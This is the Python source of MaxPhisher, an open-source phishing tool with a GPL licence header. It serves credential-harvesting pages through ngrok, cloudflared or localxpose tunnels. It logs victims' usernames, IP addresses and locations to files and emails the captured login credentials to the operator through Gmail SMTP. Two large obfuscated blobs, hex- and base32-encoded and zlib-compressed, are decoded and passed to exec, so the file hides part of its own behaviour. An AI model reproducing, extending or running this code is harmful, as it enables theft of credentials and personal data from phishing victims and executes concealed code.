# -*- coding: UTF-8 -*-
# ToolName   : MaxPhisher
# Author     : KasRoudra
# Version    : 1.0
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: MaxPhisher is a phishing tool in python
# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
# 1st Commit : 08/9/2022
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : PyPhisher, VidPhisher, CamHacker, IP-Tracker, StromBreaker, Seeker
# Env        : #!/usr/bin/env python


"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red} __  __            ____  _     _     _
{cyan}|  \/  | __ ___  _|  _ \| |__ (_)___| |__   ___ _ __
{yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
{blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
{red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
{yellow}{" "*31}             [{blue}v{version}{yellow}]
{cyan}{" "*28}        [{blue}By {green}KasRoudra{cyan}]
"""

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

# Get Columns of Screen
columns = get_terminal_size().columns

websites_url = "https://github.com/KasRoudra2/maxfiles/archive/main.zip"
repo_branch = "maxfiles-main"

# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
sites_dir = f"{home}/.maxsites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
nr_command = f"{tunneler_dir}/ngrok"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    nr_command = f"termux-chroot {nr_command}"
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"


print(f"\n{info}Please wait!{nc}")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'======4AY4Y3UPV65776BZPVFHBFTCCO4NF2HGL3HYBFYFGGOH3B7UBIS26LKC4LOZHT3Z5CZX34GBLTBE5P4LNOMXNXR2SG3C4X5ZA4O64ASZRTGSK2QZLSVSA2G5OYHTJL47DCD7P3WN5L4G55SWG2WBMPDAB2JEFPLBHINCZR42VYJRQTLXV4ASTLYUUQI5IBYUKB3WDWH3H7XSO6WKZCHUAAX63U2BITFTSV6D3E43J3U7GFFV6PLTWT7EAK2EYY4VZ6EVKQMLQY6Q46T624QAEEW5GV7JWSDSD6PSD7BR7DNP4SYZRA4SUAWSFZRHW4YDVCIG77JMZL75BC7IGKOSFNBPRLHTNZZHLDJFK2USKUJY3CBVR2XBQ5O64V6M7GVHDH4ECMA4MWF5T5ZZDYXK4Z3JXPC2646U6N7BXZXW7OH4EA2PDP4M7T5KUKP6Q3APISHEATVBYJA6YGBFXQJFINL2H6IXNUSJIVQTICG2ACDM45TXSBCCY567EDZIL3MALNIP4K3QOCF7WGJDU55WO6IBQMMXRUD7ZK5MJCCJ7AOUL4ZVMTJ5773EHG5OLFKZBD5K7B446TRNSRQ3ZV5FPT5XQ2ZY6BOQIHQVGG2B4TU3MLMT73FAVYNB3QH6FKPDBYAUXUHHV6XHD5SUQ7KYNODH3ECBRICFGXMIBQSXQWORGCIAX5UNUHJNODU5IHAAUZXRUWMBCHXWYJRQDF2Z6UBA3SXIOGG4ZEGI3WVWJGLP6CEPTAB4MHK55UE4AMLHA764XQYVUWT3C4H47XY5346LGJLMAGPHI4TORNQZSFQB67EYWAGBUCEAAKOAPK2RPOLYZ6XSFQHU455W6LAXCZDHF6S462GSPATKLJNYWFMAMLZ76IFJQM6AHLAEKPVC3FPZKJSQDUHMGHVAKLDHOO6J5GYLDGU4ZVWUXG4JVR7YOLA6GY24BPGLIXTKJJJDOK6ZUUHSDOLDKDFLSTQX4HGLHE3W6BZLQYDANICY2BA6KKRADJQQH6365BTKPIQYMDWUXBVSTAXAIJPRFQTDGJ2A4O7OFDPIYMPW3VKGND75TCJR6XU2TBKUQAYVLRBVKGINI3SN7EYI7E7AUXGWBJZOQCIHTQPQ67TWCU4HSWTOZLGNSY37GJCN3QS6LNZL542A7P3X6U27UMMC5DKIRMAQCQX3IDGQXUOPPJ7S5ALAKBRV2UBSVWARX26RNBZRUAFTMGR2FJPIBUUXMW3OXOPZNKJ3SQOQWXB2RUN4VPPFIR6GX2MW5AEUUMRXNBIT3ILDOT7IHVFTNM27OE3D4K2TL5EKHNYDDU6WLCVXXJJ65762IIXGW3HZ3KQF3LFMBHVRWKVB5AEHMHA7DALJHLIJPHL6HJRFN4HOGP4PYHPC3A7JIZKV6APC3VB3MIEKRDGEYRRLU53IQZI47GQQB2NTHHQZ3D4SXVHFBIGF7JUYAA5ALSPSBEPZXS5TQ6YDPPKVHRBXOWOBX5QJSIANKBV64QQGNTYZXA757P7GEKE33LQH6HUKG6ZRFFH3QF2HAB5B43SPJPJEURFCCIJKIXDI3UPBL7A6Q6IAWVCYODJ2VNNAGQTF2ACRFAOOPAAUJUNUFGVF4CFI4ZW2UMEYCGVEOCQAINH53423C22PL7DSSC6UJ3CATLBRBPHIWZNINMLVMG2L3PX7NMC7YF3W4TQFDCJKL4N6T5PY5KKZDR5YUX6FC72RPPEQM2K7N22R4A66MPPL74P7MZZYVP4A5CYPKMOWRHOWD465VKGBL5ID4HIQ6BRRI3BDGDSVKGLFPOGTJJMUUKL2XNNUFOB2X7U5GKOJWVST4HD3573QTTNOZ55NLN5TT2735XBDCOI462NDPD2D46HWBQCGADDXG53A2C2PRKG7OPSHGNNLMTQJU4RMY6JPERYSI6EJB4OA4BUNNSTVZR55E5IANFFFJKCUHPSHDHKFIZAL4ZQRBXDTQCEHE2DMT2Q3J2IMN5AW3IRT33LN3A4JQV4LMUMSPCSBMQDKPSHXV4ZPZ4STQ44C6VSAEXRY5AU6DFISGCHQDYO7YR4LAWO3M7VGUXD7OWWGB2QCILZNM7GPNB2C4UDAWGQKX2OJYZLOUZIPXEKCO3HAY2JYFASV7QI3ME5MTPZIOTLTXOAQSRAF4ZGZSH7JIMYDKZ6N7U2G3UF6GMTZIYSP3YAQZD4X3ZKXQYIWDUUNUMHL6S2DGA2X4V6A76DFDBJJE6FUGBTXI6YQJ76WLY2Y36HCTGLPZPHH5CIGFVBVMELNDN3LQ6IHIHUBGOZFDXRZMXMT6CW35YJVT2MTBCYD6SWXNH2E5MBJBMDA7XEMDUKF4JO7PMUIP26IPBK67BHSA2CWSMQKG2HSQKLQNEUNORF57Z7KQZFP3HV3NRCAHD4QEYMHQ6SZCPQD3LS3F3HSE3HIENFUSOMHJYHJJQZ7WXNH56PXTBDVQX7BJSYHZOU23IHJDQA2BETBQTGQVNAIYSUAF6HAPBVM3R4TUZOVCCGK5OGJS7YDUYCJUABEYFVWA5WHO4GV6H2USYYLC5M4IG55KITJQF4QGFLIIUEOP4TCBEP73LEPAHRXS3S3RLFATSCM5E3IYA43D2IGY5THLTYWIWGIXELF6KZSRNXDAJCYSUIPTEXBOEMEU7HFCGIQQX2ANB7OJ7OQIKNQPQ4CTU6QSCLJNDU4LQ2NEOQYK6VMM57GHIEWEGFXHC73TLLP4JFO4WCXSPROTHICROZ7AL3A6OALNEGJDAYRNCWHNDYYAWOGFGGMUHMAJZPZAOBBARCCENHHLFR7QDNE72UGDYQVEEW6DXAEVEMD62CFPFFXBKMGYUKQWESZGOL6KZRW3GXLNK2JGAGTS27SCE4LI6ZHYG5EHTTUZ4263JZ2QS7CV4SZDL7XUA33H24SQOHOBE3V2IY2DMSC5TDNGCKKTBBZYGURYIIIVWIKV4E2EOIPVGP5J3SB456FDH5A4FG4K5EWMZW5ND57XE4ZP226G4OCY6NATJYQTL3OI34UPFW2L2U2AJLDBYTT55ICJQJI2B75X566XPXVFUTI6AUY2RH3XUV3X63OVDNF32JZZNJ34IAKS4VPRJDKKRONFRIHGUZ3KLZLJSI6336NC4UWFP4TU3RBIOQRHJUQEAU6B6WQX2OHMF2D6WBODQAMJJFBA25GAQBUSQBXAM35Z3YGIUKN2ZVBYN3ZT7D2RTZD7GHPMKUFH4SACYCMB527AO3SPVUDQZ2DLHZRSUGUKOWSHVJT7OHCHVSOIAXAYP6PQZL7YLE4HEZDQRMT6XI75V3WQMIBR7W7MK23ZXZQYGUZNI7TCAPQS7JPG4CVPBEK7BAWTOO5QGT4MLQAXPVTMGSMMNG4DCOIMMMXECFN5CRHFXVW5EBV2QZPOTKTCMQLEIEUVOLDPAWABJASCRLXJP2XXYXW2YAZWJNGX44IEMWX4F2A7XUXP6XDNOCIFTOPADR6DYIN6EENOTRV4UCOTAOF4S2FL4SJRXAUMEQDYZ5V5SRLKOWAY6W5RQ2FCOOIX5X4N3JE53LABBYCLUCQ34KKFMOB7XPCL2VSFHQTVP32EFBEBF5OZFNH4JRXYDIUR4B7JEF2KR2UMC5RRI2FHX6D23DK2G3MOGH2YXBAG6GWPBXOWIYJ42ZYYGJIRDXNRWIYYXZOEFPHVNRSWAGIORZQRBAMSQ2Q4D7GWRGJ7OOZKYGJVRKD423OPESXY6CHTQRWHJDSCU667333VCURPU3D5RRWA6JQQBN2I6QCLIKCINMDRFAGFANLQ2IKRLV5GTXUT4GZBH7P33TM7KZJTVJBNISYJS4SHAIRM7JVM44RRWSDMPDYSZ6GJBV35QINMHAWLFOHLNWVPTZI6U4NXQZGXA5DZGZPPFG47N54UGCQ5E2LHE5B6YKIO3QITCT7FZOVIPX2HOKCIPN6THPGBUFV6WWXQYFIPLPAPCZZAOWQ34AXXC77JY62JPBPEVAUUP3QH5NEDKIAEGHUWBRPBR3OJXSCKXSBR23ZKDWSD65XMU5DXNMDGPEMVNIZF4B4Y4YWZET6TVHTINNJDYLFUQUUE2BI7HPBXVCH7426R3TQCQJAI2V3X4QEJWMJDPGIXKWAFYDPORUTVJLZQKBOUZRRJOIP4ADBE4MYVJCWQ6FASV5QAGP7MSQ4UOSPJVK2PEY2SRXQUTU2INP2TOG4UAAJVRX2DZLRTHPCI2A2OGZ2JABDA2M5AKV46O5FVMLKZC6CG7ELPWROCGE55AZUMV22YA2ZTBJR72N7FUXRL347GHL7C6KTSXUWAEXQRWOWWYYO5FUGWBTR62JCG4R3ZFIBFSHMTG7XF6I3YBY6NIPLRDLWMHS5SOWGGARHOECPZYQ4UOJ4GNNEYD376NWAD2ZBVTEYBUESLWU3HSDIA2TWG4ZYJBBHZYOX55VMMYTLNSXWBY63BGV3LP2CBGKSQ2QLAAK6ZIVZOZUMYLEDTZMBBUZI4JWTL7ORERBDY2P7W6PQTBUU6VAPRIBTQQXGSQ3HCKVBML5S5CQSHGPKI77AXYMP2LSVWSX7E2NVYCWT6J3HAGY5D5XLA5DM4OYEZFY6H3EJVUFTWJKQSEMNZL7U4S3QDS4X6PDTJD45S7GAJO5X4WCFSQL77IOCDMX4A26IC2XRQPY7DXXTPD4XLLGXHKXDH35AXPXNXRIJKTR2FA4BBJPY4CY4VQYRPMGZ6UXMQPR2KU442I56LZ2VYXYSRMBWQXHRRUNXBH2NEOK77GYCUAQKUC2SI55L2OQXHKQEXOIBPBQ7V4OXUQ67SR5XFKMACQYPDVM4QKGZHVF2BJ4FNOSRHY6RRNLCFJ2V4F6J6NWMS552QTS3YP5SFAYWIJTC6K7T4JH52QSXHPO4CGMYMYTT4N6EBRP5TWCIERXJMEDHM5CNF6ET7M6QWTLMJCLX3BKDYSUGBXK4W5EP4NARFTAGBHJYVDD3HZ3HN3TFFMNLJILHW6CWG3ZDVYNN3OUT6SSONRQUB6T4Z476SPOXYSZRLPRKI6ETFXWAM7NZHFN632DONSF2VTUTLKQPCMMB2P55SUW7JX4RGEEV7OAVKM7DVONKIVIMOBDZOV6U3D44YXSEFJPF54YW5NFRMEAEWE3GF5SRBZSNWIAEYSQWPKF6JWGQZTHK4S6ZS3I5C4AJCNVJSUKUTU3LCVBVMRZ3FUHZM6NWGD2JXH3PEPHWITCUWTPC7LGW4WOWPB2LEHNNOES52FZ36WKU3AZ2QPRUAXEDJ4LLC5KPY7NMYXZGE3UQVYWQA4B2NXRMH3UESNRCKLIXBMQMMOK6NABY5C2ABCITVXXAF6YQUIMPVAIO243MZ2DOYU4PSWSGCY7JSDCV4DDFPXLDDXTLYP2SPP75FN4GYH3P7LBRWLU7DMTF4ZVDIIZ6UOXPWJFGGC7FQN7JFO4SCSY4JMTOOQUMXFEUNCGM7E23DGKQZSOGK4JAS23QS3CT5ZG7HLCEHHOFL4VI3AFKXGPPT7OMVXNQ567RT5WD6RLULPDC54G7TGPN4XYGHFFMRR6TZIPMEVNSGNRJVTYIMGVYCEDGEPVEDLEC2CQ7VKUTKVEBP62MRA6S3Q6A3JSVBZY3F4IXT36AP2FIPO6ZI2HQPJYAXNTVGGW5R2W2NT4K5GLIEYMOB6OBOZNLCYD63WFL4BP22PT7J6CSGZI5LVOOUQ35BU6S4X5FHNI47BDJBFHSEF37D3HD7QGTFLJOH5NJGMMXIAP7CPDHNND2WOWCKH536IPO3S6QA33UPVBGVCCZAFH3HDHSMQA6QA4WBQ3NLVOQMQY5LV53YY7IJRPOLWP2HLQJFNZSBSPNNHDK2QAEUG2LMGF6JHSISXAF3WBFLYMFNZGPA5ZKRZ3HDTHAT6J3OTGUOIE4EFWIGR6S7WSBUDDEZNESK4H5G6JHOCUBLQKHR5ZGMTKJ2LTMAWM7FUQV4Q22XEIQPA2GPOJWFIZXXCMGBRNCZWHUSBP7WGPFCOXOWY2PP5J34CK46OIA6J3PTTZX3QLBOPIZKERAY73NBS6RVMVR2WLT5DYKVHSJ7YWJRY4FIWVEGLMJGOXG5K3SJZW5KU4LLLUYARRJAIGDRLMFPM56RHLY5J66CLXSLT474DH4V7SWGQT7ZGQEYQVY3IKS6TT533KOEL2K7PPQKC2QF23QXKMLHMSDHOC3I62LNRCB32O324YZH7DIERVD7QOBCNLNNB37YEAUV4B2HPMXXPWDGXED66RNMCMHTBWCFCGI6L3HXMCO3DGZ73HAK73FNASZ2UV2OAEP2ZKB6VM4GXABXO46JNNVI3EPRTFQHZUGTH3PPEHKWU2QYZAYHBGCH4M7ZKACWEMT7OKYFGEGZFSWEFSP4SUOTLOFS47XX3UKEUR3JUUHSHDEBRSF4GY5ZSM6B64VDEOQCPGRPJIP22IFJBMPKAZWOZHFV5UCFRA3SOKJ6FC62ORR4TZUYIJ5NAY2LTK6JCJPCGNPOGS64UWLBR4MZJAN7NGR3XRTNEV4VULWXMPDT3LXDXUWZ46CP7TW245FZ64UY3WUQDCIFC7ND4W2ZLYNQ2BDBBBM5N5TJ6YQJ5Q4SULY3HZUZCXHLIXHUYKJNG52ZMMC3LRKOKFCTIFDVUYEMSZFKFKDJ6YD5QQRHUIH3X2F4GLQOQJNHHXZQOGTBLNJBRVTY3Z2VFNEQI6YPAHHOMMQY7MF24BWZGWRSJ274NIYYMXYAEJ6MCGVUBUEK3MZIZN5M6GHGSUVENHSG3CG32J5LS3TNUPSB5R37HKB6V2VFIK7XSUUWKC2PCG3W6LDYH267EPBK45L5FEQ3G64XOUVASYL53CNWSZ55N6QHD5GZGW7ZYYKYJVD3ZI6WNPP6I6OIAQ56PMDQAURCXYNVGK5ZHXXCHWK3H7F2IRQMQXG2A7FNDCRG36KQ7NBMXE57VHGLXKYLXRRT6LUUC6SB2K4ZUXXKXHI72PP6BQY55343H65B7TMS6DRIXJSKXUEPYGDH5EFVF4RVMZLPWJZDXOLIFXK2J2S2WFFYYJQHIGCB52Z2O6O6ECGWGFNRLICYXLNLXM34W6SBK5HCHIZE3CS3UCF2RPHKALZ4JW5G5LK3WX4WEGZXTMB64N725NHLFH37646XTQJ3XW3UO6U22O44JCXPEJ4RDDIIGKO4PBKPNO3E34QLTXUOFEZVKS5OKQIYPT3D44EZHLVLZKPCMOOGENYGRKHS2TO6LBEIRMFD5GXYIQQFKHFXJWV4ZPSUIXWRU7536LPZUZXPLYDYOP523RFQ4ZESHCQF3FBFIU6R46SL2AZXHUNPF5XIU3UWTF74RLGW5HDZTCK6HRGNSGS2OJXN6Z3XX3JKS5U64R6NJE44HSRNSMZTUFTQMCRKPEQPKE7SMNCRWD7BYOPTKV7W4QSKEIPTGEJNPQJC5W57LVTFD3E4OYAVTYUXFDLZKWM5O7U2PYQCXP46HHI7W3H2YDOSRIMQGMLWL3LMWGXLOXWS2AON5VQJYLKB3ZGOJY6F445ZHC3EGIR43FCP7HZLNNIPLR7SB6IJKYXYTTWQ3GXMMGFNXP3UJPWYERDLQHKCZJUH36IDMX6QPBIHJT55XEWXDXTXTNMGYIHXSI33GM7IP37OM4LEN2URPXQOPUXV5YEG3A2DDSVKYIX5KUOCGPISQFCDVKR2YZFKZPXYDT2TJZRJT6RU66OXY55PND2KXOOLM3S63GW77JHOYORWGMEFPIVZ62F726LX2UFCDKD2237GPPP77XQFZJ2II2ERATR6754G4ILYI4V3VQ3SQ2SAIUNZRO5BFNLM7O576AZ666ZFFSLSKRPTTNHZGYPFVTP6GUYNOR5YK546GPX24RFFEIFOJ7XZX5NVUMXVTZZDCL4BS4FZB2HF36FT6JNQQFES5NTSKHCLXY372HUGY4XLUUPFK7OYTCBZXTHKLNIU7JZ5OSKR7VK6CP626RYEDBPO2ELYZKP3NCUR76W7GTS3IJ3NO32PQ5NNLCNU7CPE5KW2ELK64CXJDKR4JZB5KUJJF7WT6RC3GIX5MOLZSYRCGT7BL25H4FIMASYEUD73Z775RLX77XP544777TXX747776V3633NIDUPGVPFXAZAUMJJ57PVDHI7SAAURB6ERDYAMHMBQTWMFO4W25J7REKES3SYRJKGLCOCP'))

# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name}")
                elif pacman=="apk":
                    shell(f"sudo {pacman} add {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("ngrok"):
            shell("brew install ngrok/ngrok/ngrok")
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


# Internet Checker
def internet2(host="8.8.8.8", port=53, timeout=10):
    while True:
        try:
            if not update:
                break
            setdefaulttimeout(timeout)
            socket(inet, stream).connect((host, port))
            break
        except Exception as e:
            print(f"\n{error}No internet!\007")
            sleep(2)

def internet():
    connection = HTTPSConnection("8.8.8.8", timeout=5)
    while True:
        try:
            if not update:
                connection.close()
                break
            connection.request("HEAD", "/")
            break
        except:
            print(f"{error}No internet!\n\007")
            sleep(2)
        finally:
            connection.close()
        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: MaxPhisher Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")

# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Download files with progress bar
def download(url, path, size=None):
    from time import ctime, time
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
    for i in range(retry):
        try:
            with open(path, "wb") as file:
                internet()
                response = session.get(url, stream=True, timeout=20)
                chunk_size = 4096 #KB
                total_length = response.headers.get('content-length')
                length = int(total_length or size or "0")
                downloaded = 0
                alldata = b""
                max_len = columns - 38
                newname_space = " " * (14 - len(newname))
                max_len2 = columns - 50
                pre_space = 0
                suf_space = max_len2
                stime = time()
                for data in response.iter_content(chunk_size=chunk_size):
                    etime = time()
                    downloaded += len(data)
                    alldata += data
                    speed = chunk_size/float(etime-stime)
                    readable_speed = readable(speed, is_speed=True)
                    file.write(data)
                    readable_size = readable(len(alldata))
                    if length == 0:
                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
                        stdout.flush()
                        if pre_space == max_len2:
                            forward = False
                        if suf_space == max_len2:
                            forward = True
                        if forward:
                            pre_space+=1
                            suf_space-=1
                        else:
                            pre_space-=1
                            suf_space+=1
                    else:
                        done = int(max_len * downloaded / length)
                        # Arrow will progress as the data increases with done
                        arrow = "=" * done
                        # Space will decrease as done increases
                        arrow_space = " " * (max_len - done)
                        percentage = round(downloaded * 100 / length, 2)
                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
                        stdout.flush()
                    stime = time()
                if length == 0:
                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
                else:
                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
                stdout.flush()
                # This print fixes the cursor to newline
                print()
                break
        except Exception as e:
            print()
            remove(path)
            append(e, error_file)
